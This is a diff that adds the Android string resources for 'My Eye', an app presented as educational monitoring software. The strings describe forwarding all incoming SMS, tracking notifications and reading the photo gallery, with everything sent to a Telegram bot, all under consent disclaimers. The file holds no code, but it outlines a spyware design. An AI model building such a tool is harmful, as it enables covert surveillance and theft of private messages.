@@ -1,0 +1,104 @@
+<resources>
+    <!-- App Info -->
+    <string name="app_name">My Eye</string>
+    <string name="app_description">Educational Monitoring Application</string>
+    
+    <!-- Developer Info -->
+    <string name="developer_name">Ahamed Rahim</string>
+    <string name="developer_website">https://ahamed-rahim.pages.dev/</string>
+    
+    <string name="about_developer">
+        Experienced Android Developer specializing in educational and research applications. 
+        Passionate about creating tools that help in learning and understanding mobile systems. 
+        This application is developed purely for educational research purposes to understand 
+        mobile monitoring mechanisms and security protocols.
+        
+        Education: B.Sc in Computer Science & Engineering
+        Specialization: Mobile Application Security
+        Research Focus: Ethical Monitoring & Privacy Protection
+    </string>
+    
+    <!-- Warning Messages -->
+    <string name="educational_warning">
+        ⚠ FOR EDUCATIONAL PURPOSES ONLY
+        
+        This application is designed for:
+        • Educational research and study
+        • Parental monitoring with consent
+        • Device security testing
+        
+        IMPORTANT:
+        1. Must have explicit consent from device owner
+        2. Illegal to monitor without permission
+        3. Respect privacy laws and regulations
+        4. Use responsibly and ethically
+        
+        Developer: Ahamed Rahim
+        Website: https://ahamed-rahim.pages.dev/
+        Purpose: Educational Research
+    </string>
+    
+    <!-- Permission Messages -->
+    <string name="permission_sms">SMS Permission</string>
+    <string name="permission_storage">Storage Permission</string>
+    <string name="permission_notification">Notification Access</string>
+    <string name="permission_internet">Internet Access</string>
+    
+    <!-- Button Texts -->
+    <string name="grant_permissions">Grant All Permissions</string>
+    <string name="start_monitoring">Start Monitoring Service</string>
+    <string name="stop_monitoring">Stop Monitoring Service</string>
+    <string name="send_test">Send Test Message</string>
+    
+    <!-- Status Messages -->
+    <string name="service_started">Monitoring service started</string>
+    <string name="service_stopped">Monitoring service stopped</string>
+    <string name="permission_granted">Permissions granted successfully</string>
+    <string name="permission_denied">Some permissions were denied</string>
+    <string name="test_message_sent">Test message sent to Telegram</string>
+    
+    <!-- Feature Descriptions -->
+    <string name="feature_sms">• SMS Forwarding: All incoming SMS will be forwarded</string>
+    <string name="feature_notification">• Notification Monitoring: App notifications will be tracked</string>
+    <string name="feature_gallery">• Gallery Access: Photos and videos can be accessed</string>
+    <string name="feature_telegram">• Telegram Integration: Data sent to configured bot</string>
+    
+    <!-- Log Messages -->
+    <string name="log_app_started">Application started successfully</string>
+    <string name="log_permission_check">Checking required permissions</string>
+    <string name="log_service_initialized">Monitoring service initialized</string>
+    <string name="log_telegram_connected">Connected to Telegram bot</string>
+    
+    <!-- Dialog Messages -->
+    <string name="dialog_title_warning">Important Warning</string>
+    <string name="dialog_message_consent">
+        You must have explicit consent from the device owner before using this application.
+        
+        By clicking OK, you confirm:
+        1. You have permission to monitor this device
+        2. You understand the legal implications
+        3. This is for educational purposes only
+        4. You will use this application ethically
+    </string>
+    <string name="dialog_btn_agree">I Agree</string>
+    <string name="dialog_btn_cancel">Cancel</string>
+    
+    <!-- Notification Channel -->
+    <string name="notification_channel_name">My Eye Monitoring Service</string>
+    <string name="notification_channel_description">Background service for educational monitoring</string>
+    
+    <!-- Telegram Config -->
+    <string name="telegram_bot_token">YOUR_BOT_TOKEN_HERE</string>
+    <string name="telegram_chat_id">YOUR_CHAT_ID_HERE</string>
+    
+    <!-- Educational Purpose Statement -->
+    <string name="educational_purpose">
+        This application is developed solely for educational and research purposes to study:
+        • Mobile monitoring mechanisms
+        • Data security protocols
+        • Privacy protection methods
+        • Ethical usage guidelines
+        
+        Not intended for commercial use or unauthorized monitoring.
+    </string>
+</resources>
